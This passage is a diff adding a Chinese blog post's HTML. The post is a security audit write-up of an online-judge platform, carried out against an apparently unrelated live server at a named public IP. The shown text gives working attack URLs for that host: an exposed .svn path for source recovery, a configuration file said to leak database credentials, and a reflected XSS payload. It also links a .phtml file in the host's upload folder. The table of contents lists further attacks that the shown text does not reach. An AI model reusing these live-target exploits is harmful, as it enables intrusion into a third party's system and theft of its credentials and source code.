@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content=". 我校内网瑞格OJ刷题平台地址：http:&#x2F;&#x2F;222.27.166.246&#x2F; 通过webvpn[即通过数字东林登陆进来后地址是：https:&#x2F;&#x2F;222-27-166-246.webvpn.nefu.edu.cn   我目前代码审计栈是： 1php[thinkphp] &lt; python[django] &lt; java[SSM,S2...] &lt; .net[Core]   个人感觉ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对本校内网刷题OJ网站的代码审计">
+<meta property="og:url" content="http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/index.html">
+<meta property="og:site_name" content="塔菲">
+<meta property="og:description" content=". 我校内网瑞格OJ刷题平台地址：http:&#x2F;&#x2F;222.27.166.246&#x2F; 通过webvpn[即通过数字东林登陆进来后地址是：https:&#x2F;&#x2F;222-27-166-246.webvpn.nefu.edu.cn   我目前代码审计栈是： 1php[thinkphp] &lt; python[django] &lt; java[SSM,S2...] &lt; .net[Core]   个人感觉ja">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/31/ec9a43631c2de6fd.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/05/31/d480ea7dea01220c.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/4dbd049c1836a0f3.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/8d71f66b246f109f.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/873605490877bcc4.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/f5205bb2b81509c1.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/ba739ad21ee79867.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/8d70cdd8cb4279dd.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/9ee589e1e8f2abd0.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/445f64fa20b261a1.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/8bbdd5814ea1eff9.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/bcb168e44549dfd6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSSOVs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSpCMF.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/06/02/d81dc9ab8b5af4e0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSFDPA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSkwLT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSkRQx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/06/02/pCSACfs.png">
+<meta property="og:image" content="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2c760899cb641454c9796f8786a4196f5.png">
+<meta property="og:image" content="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2c57ea1b4b91944f98d7927fcf5de3962.png">
+<meta property="og:image" content="https://pic5.58cdn.com.cn/nowater/webim/big/n_v2a9754c1b2d064e0a857d982b33e4dfde.png">
+<meta property="og:image" content="https://pic5.58cdn.com.cn/nowater/webim/big/n_v28f8fa88c9c60496e8ae91d1205efbff3.png">
+<meta property="og:image" content="https://pic6.58cdn.com.cn/nowater/webim/big/n_v2111510981e364dfda51951f8d4a3d765.png">
+<meta property="og:image" content="https://pic7.58cdn.com.cn/nowater/webim/big/n_v2f551c85bee574bbfa5b8e3e4073d8b9f.png">
+<meta property="og:image" content="https://pic6.58cdn.com.cn/nowater/webim/big/n_v235cd3b96bbab470fb13acb62c5765125.png">
+<meta property="og:image" content="https://pic1.58cdn.com.cn/nowater/webim/big/n_v288682423ed474b0e862ae27b725d8442.png">
+<meta property="og:image" content="https://pic1.58cdn.com.cn/nowater/webim/big/n_v22824a1e39d064d6db0294726de5bfeb9.png">
+<meta property="og:image" content="https://pic3.58cdn.com.cn/nowater/webim/big/n_v2fe5d5b53be9640f1a1974e9e9e6fc976.png">
+<meta property="og:image" content="https://pic3.58cdn.com.cn/nowater/webim/big/n_v227325ad97a224c30bd5a1ecb8848453e.png">
+<meta property="og:image" content="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2c380234bc1d64ee990bdfc0262c16d64.png">
+<meta property="og:image" content="https://pic8.58cdn.com.cn/nowater/webim/big/n_v2a9060e5dbf054b22aafdd7490be758be.png">
+<meta property="og:image" content="https://pic6.58cdn.com.cn/nowater/webim/big/n_v220315508ca824a45a761e14db048094d.png">
+<meta property="og:image" content="https://pic4.58cdn.com.cn/nowater/webim/big/n_v200cecc390cc64591a7bd57eb77f6c36a.png">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/145914/28/39148/39212/647acac1F6279c7d5/404b26b57e9fde9b.jpg">
+<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/217765/12/28352/37606/647acaf6Fbb3cefaa/e584b92d46421a23.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/144489/37/34067/38918/647acbe0Fc64cd707/66c73a3072873c96.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/129689/30/37251/75470/647acbecFfe1c55ff/d7ffe5b811a14fbb.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/141824/40/32422/78846/647acec4F61679cf1/2327b0f864241237.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/214197/40/30956/88769/647ad4bfF1dcb409a/d283209eb4432351.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/46930/28/22117/57334/647ad4c5F08f0038e/7589aefa980533a3.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/221607/36/28987/59351/647ad4d1F2f2f5a2b/ddf366d3c49d8168.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/128012/20/37968/27665/647ad50fFe2d89aa8/2bdb1b6471e22519.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/121164/9/25546/31112/647ad759F9422d5d3/86eadd8f10946f76.jpg">
+<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/89814/7/35261/44459/647b08deFd8652702/69b62f40a7037b33.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/202122/37/34668/38055/647b0fbcF3be727e7/c102605b9c4376ec.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/118665/24/36400/43475/647b0fc5Fb2761ee3/c4e09042ac347149.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/111519/10/39206/56485/647b11b4F02c714f6/85d08649793cd949.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/114588/30/35523/60542/647b113eFc4442d2e/ba10330a065bfb31.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/132861/27/37537/59928/647b1083F6964de83/23b5b532054c5d53.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/146592/26/34945/47273/647b0484F2e4b9934/67f9bc6d8e3c91fc.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/117660/5/37565/102066/647b040bF72d8b0e4/961f27032c93fdfc.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/223927/38/22588/28449/647b1287F96d03ec4/788bbdb21d4f9762.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/145132/2/34064/44192/647b1b2dF76549bdf/60dbbf00abf88be5.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/76967/9/24597/51705/647b1b46Fe03f4e04/764e09f536bf66c6.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/121818/35/38605/37648/647b1b57F98a1aef8/a176b65cef423623.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/76755/3/25557/38619/647b2e2dF37b44de5/34fb2b67373b1dde.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/124343/9/37712/105073/647b2e4cF8f01b80c/ec5a690ab9df2571.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/38927/36/20308/60946/647b2e64Fc77876c1/16ce0a0b6724ba5f.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/146649/37/34500/113315/647c2985Ff0522603/2b12eef96050a274.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/216104/3/30893/290619/647c299aF9b6064b6/13b03e6b98472131.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/144476/15/37293/70692/647c29daF6a0be934/3ed02f88870e24c9.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/211207/33/33229/115676/647c2d95Fd2eb970c/34e365291462b9d5.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/217073/1/31679/113779/647c2d99F3c44de63/a38abad173aa1086.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/138605/13/37686/12964/647c392eFcd681b77/973aa8ff398c60cb.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/109471/1/41461/43876/647c3b0eF09fa8dc3/32dabcdb3aa7f92f.jpg">
+<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/147169/18/37321/21063/647c42a4Fbd4deebe/d002cd85e7678686.jpg">
+<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/72682/18/20503/359735/647c4361F3deecc46/f9debbb0356ad76d.jpg">
+<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/219915/24/30461/78576/647c4da5F60b6ae9c/d595ba14641870e1.jpg">
+<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/139075/3/32715/70197/647c615fF736a66d4/3872c74650a2fc49.jpg">
+<meta property="article:published_time" content="2023-06-01T12:39:36.000Z">
+<meta property="article:modified_time" content="2023-06-06T01:17:12.441Z">
+<meta property="article:author" content="塔菲">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/05/31/ec9a43631c2de6fd.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>对本校内网刷题OJ网站的代码审计</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/06/02/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E7%9F%AD%E4%BF%A1%E7%94%B5%E8%AF%9D%E8%BD%B0%E7%82%B8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99-%E6%89%93%E5%87%BB%E6%8A%A5%E5%A4%8D/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/01/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99-%E9%92%88%E5%AF%B9java-dotnet-python/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&text=对本校内网刷题OJ网站的代码审计"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&is_video=false&description=对本校内网刷题OJ网站的代码审计"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对本校内网刷题OJ网站的代码审计&body=Check out this article: http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&name=对本校内网刷题OJ网站的代码审计&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&t=对本校内网刷题OJ网站的代码审计"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#svn%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.</span> <span class="toc-text">svn源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.</span> <span class="toc-text">数据库账户密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlexPaper1-4-5"><span class="toc-number">3.</span> <span class="toc-text">FlexPaper1.4.5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-2"><span class="toc-number">3.1.</span> <span class="toc-text">反射XSS * 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.2.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlexPaper2-2-1"><span class="toc-number">4.</span> <span class="toc-text">FlexPaper2.2.1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">4.1.</span> <span class="toc-text">反射XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2"><span class="toc-number">4.2.</span> <span class="toc-text">无回显命令执行 * 2</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">4.2.1.</span> <span class="toc-text">无法绕过的反射XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84XSS-%E9%9C%80%E8%A6%81%E7%99%BB%E9%99%86"><span class="toc-number">5.</span> <span class="toc-text">反射XSS-需要登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">5.1.</span> <span class="toc-text">信息泄露</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-gt-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">沙箱逃逸-&gt;命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JAVA%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">6.1.</span> <span class="toc-text">JAVA沙箱逃逸</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">7.</span> <span class="toc-text">后台文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0xml%E6%89%93xss"><span class="toc-number">8.</span> <span class="toc-text">文件上传xml打xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF"><span class="toc-number">9.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">10.</span> <span class="toc-text">无回显RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin%E5%90%8E%E5%8F%B0SQL%E5%86%99%E5%85%A5webshell-%E6%9F%A5%E7%9C%8B%E4%BB%BB%E6%84%8FSQL%E6%95%B0%E6%8D%AE"><span class="toc-number">11.</span> <span class="toc-text">phpmyadmin后台SQL写入webshell + 查看任意SQL数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin%E4%BD%8E%E7%89%88%E6%9C%AC%E4%B8%80%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">phpmyadmin低版本一系列漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%86%99webshell"><span class="toc-number">13.</span> <span class="toc-text">SQL注入-写webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Yii-1-1-12%E4%B8%80%E7%B3%BB%E5%88%97%E5%8E%86%E5%8F%B2%E6%A1%86%E6%9E%B6%E6%B4%9E"><span class="toc-number">14.</span> <span class="toc-text">Yii 1.1.12一系列历史框架洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%AF%B9php%E4%BB%A3%E7%A0%81%E6%89%8B%E5%B7%A5%E8%A7%A3%E6%B7%B7%E6%B7%86"><span class="toc-number">15.</span> <span class="toc-text">尝试对php代码手工解混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">15.1.</span> <span class="toc-text">SQL注入_2</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        对本校内网刷题OJ网站的代码审计
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">塔菲</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-01T12:39:36.000Z" class="dt-published" itemprop="datePublished">2023-06-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>.</p>
+<p>我校内网瑞格OJ刷题平台地址：<a target="_blank" rel="noopener" href="http://222.27.166.246/">http://222.27.166.246/</a></p>
+<p>通过<code>webvpn</code>[即通过数字东林登陆进来后地址是：<a target="_blank" rel="noopener" href="https://222-27-166-246.webvpn.nefu.edu.cn/">https://222-27-166-246.webvpn.nefu.edu.cn</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/05/31/ec9a43631c2de6fd.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/05/31/d480ea7dea01220c.png"></p>
+<p>我目前代码审计栈是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php[thinkphp] &lt; python[django] &lt; java[SSM,S2...] &lt; .net[Core]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>个人感觉java和.net的站由于是服务于大型企事业单位所以功能点更多，更复杂，而php就适用于中小站点，而且php安全安全上的领域知识是要比java和.net少的，比如，php没有真正的内存马，而java和net的内存马有很多，还有就是在webshell免杀领域，net实现rce敏感函数有非常多，脚本格式也多（aspx.asp.soap.svc.ashx.asmx）</p>
+</blockquote>
+<p>为了不影响校内的程序正常运行，我们在公网找一套相同的站点审计：<a target="_blank" rel="noopener" href="http://118.190.104.186/">http://118.190.104.186/</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/upload/uimg/1656650856-8b04d5e3775d298e78455efc5ca404d5.phtml</span><br></pre></td></tr></table></figure>
+
+<p>本站是基于yii框架开发的，但是yii框架部署后只有web目录是对外访问的</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/4dbd049c1836a0f3.png"></p>
+<p>但本站可以对外访问的是：<code>/var/www/</code>，这本身就是错误的，导致了很多的安全问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上海锐格软件有限公司</span><br></pre></td></tr></table></figure>
+
+<h4 id="svn源码泄露"><a href="#svn源码泄露" class="headerlink" title="svn源码泄露"></a>svn源码泄露</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//118.190.104.186/.svn/entries</span></span><br></pre></td></tr></table></figure>
+
+<p>存在页面，利用svn源码恢复工具就可以了</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/8d71f66b246f109f.png"></p>
+<h4 id="数据库账户密码泄露"><a href="#数据库账户密码泄露" class="headerlink" title="数据库账户密码泄露"></a>数据库账户密码泄露</h4><p><a target="_blank" rel="noopener" href="http://118.190.104.186/Context.xml">http://118.190.104.186/Context.xml</a></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/873605490877bcc4.png"><img src="https://s3.bmp.ovh/imgs/2023/06/02/f5205bb2b81509c1.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/ba739ad21ee79867.png"></p>
+<p>这里有两个版本的<code>FlexPaper(FlexPaper是一种基于开源技术的在线文档查看器)</code></p>
+<h4 id="FlexPaper1-4-5"><a href="#FlexPaper1-4-5" class="headerlink" title="FlexPaper1.4.5"></a>FlexPaper1.4.5</h4><h5 id="反射XSS-2"><a href="#反射XSS-2" class="headerlink" title="反射XSS * 2"></a>反射XSS * 2</h5><p><img src="https://s3.bmp.ovh/imgs/2023/06/02/8d70cdd8cb4279dd.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/9ee589e1e8f2abd0.png"></p>
+<p>自己构造闭合标签</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.104.186/FlexPaper_1.4.5_flash/php/simple_document.php?doc=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2023/06/02/445f64fa20b261a1.png"></p>
+<p>另一个同理</p>
